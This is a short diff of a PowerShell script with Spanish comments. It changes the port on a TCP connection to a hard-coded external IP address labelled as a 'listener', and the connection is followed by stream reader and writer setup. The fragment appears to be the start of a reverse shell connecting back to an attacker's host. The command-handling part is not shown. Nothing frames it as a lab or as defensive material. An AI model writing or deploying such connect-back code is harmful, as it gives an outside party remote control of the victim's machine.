@@ -1,6 +1,6 @@
 try {
     $c = New-Object System.Net.Sockets.TcpClient
-    $c.Connect('147.185.221.212', 29337)  # IP del listener y puerto
+    $c.Connect('147.185.221.212', 29377)  # IP del listener y puerto
     $s = $c.GetStream()
     $w = New-Object System.IO.StreamWriter($s)
     $r = New-Object System.IO.StreamReader($s)
